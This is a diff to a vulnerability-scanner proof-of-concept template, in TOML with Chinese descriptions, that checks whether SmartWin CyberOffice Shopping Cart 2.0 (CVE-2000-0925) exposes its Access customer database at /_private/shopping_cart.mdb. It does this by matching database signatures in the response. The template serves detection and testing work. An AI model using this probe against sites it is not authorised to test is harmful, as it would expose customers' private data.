@@ -1,10 +1,14 @@
 [info]
-author = "ave"
-description = "验证目标站点的 _private 目录是否存在世界可读权限，通过尝试访问该目录下的 shopping_cart.mdb 文件检测敏感客户数据泄露漏洞"
+author = "AVE"
+description = "检测 SmartWin CyberOffice Shopping Cart 2.0 默认安装中 _private 目录的 Access 数据库文件是否可被未授权访问。通过 GET 请求 /_private/shopping_cart.mdb 并检查响应内容是否包含 MDB 数据库文件特征（如 Microsoft Access 数据库头部标识），判断是否存在信息泄露漏洞。"
 id = "POC-AVE-2000-0678"
-name = "SmartWin CyberOffice Shopping Cart 2.0 客户端敏感信息泄露 PoC"
+name = "SmartWin CyberOffice Shopping Cart 2.0 信息泄露 PoC"
 severity = "medium"
-tags = ["ave-2000-0678"]
+tags = [
+    "cve-2000-0925",
+    "information-disclosure",
+    "shopping-cart",
+]
 vuln_id = [
     "CVE-2000-0925",
     "AVE-2000-0678",
@@ -17,6 +21,20 @@ logic = "all"
 method = "GET"
 path = "/{{BaseURL}}/_private/shopping_cart.mdb"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Standard Jet DB",
+    "Microsoft Access",
+    "shopping_cart",
+]
 
 [[poc.requests.matchers]]
 expect = true
